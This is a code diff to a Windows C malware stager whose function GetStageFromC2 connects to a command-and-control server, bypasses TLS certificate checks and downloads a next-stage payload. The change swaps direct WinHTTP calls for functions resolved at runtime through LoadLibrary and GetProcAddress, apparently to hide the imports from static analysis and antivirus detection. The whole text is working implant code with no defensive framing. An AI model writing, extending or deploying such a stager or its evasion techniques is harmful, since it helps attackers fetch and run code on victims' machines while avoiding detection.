@@ -1,8 +1,8 @@
 #include <windows.h>
 #include <winhttp.h>
 
-// #include "base64.h"
 #include "settings.h"
+#include "imports.h"
 
 #define _CALLBACK_URL L"/stage"
 #define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\r\n"
@@ -26,28 +26,32 @@ CHAR* GetStageFromC2(DWORD* sSize)
             SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
     // init the connection
-    hSession = WinHttpOpen((LPCWSTR)_CALLBACK_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpOpen");
+    hSession = rWinHttpOpen((LPCWSTR)_CALLBACK_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession)
     {
         return NULL;
     }
 
     // make the connection
-    hConnect = WinHttpConnect(hSession, (LPCWSTR)_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, 0);
+    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpConnect");
+    hConnect = rWinHttpConnect(hSession, (LPCWSTR)_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, 0);
     if (!hConnect)
     {
         return NULL;
     }
 
     // setup our request
-    hRequest = WinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
+    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpOpenRequest");
+    hRequest = rWinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
     if (!hRequest)
     {
         return NULL;
     }
 
-    // let us connect with bad ssl certs 
-    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &Flags, sizeof(Flags)))
+    // let us connect with bad ssl certs
+    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpSetOption");
+    if (!rWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &Flags, sizeof(Flags)))
     {
         return NULL;
     }
@@ -73,18 +77,21 @@ CHAR* GetStageFromC2(DWORD* sSize)
     #endif
 
     // make the request
-    bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)payload, strlen(payload), strlen(payload), 0);
+    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpSendRequest");
+    bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)payload, strlen(payload), strlen(payload), 0);
 
     if (bResults)
     {
         DEBUG("made callback");
-        bResults = WinHttpReceiveResponse(hRequest, NULL);
+        WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpReceiveResponse");
+        bResults = rWinHttpReceiveResponse(hRequest, NULL);
 
         do 
         {
             // check how much available data there is
             dwSize = 0;
-            if (!WinHttpQueryDataAvailable( hRequest, &dwSize)) 
+            WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpQueryDataAvailable");
+            if (!rWinHttpQueryDataAvailable( hRequest, &dwSize)) 
             {
                 DEBUG( "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                 break;
@@ -107,7 +114,8 @@ CHAR* GetStageFromC2(DWORD* sSize)
             // read all the data
             ZeroMemory(pszOutBuffer, dwSize + 1);
 
-            if (!WinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
+            WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpReadData");
+            if (!rWinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
             {                                  
                 // been an error
                 break;
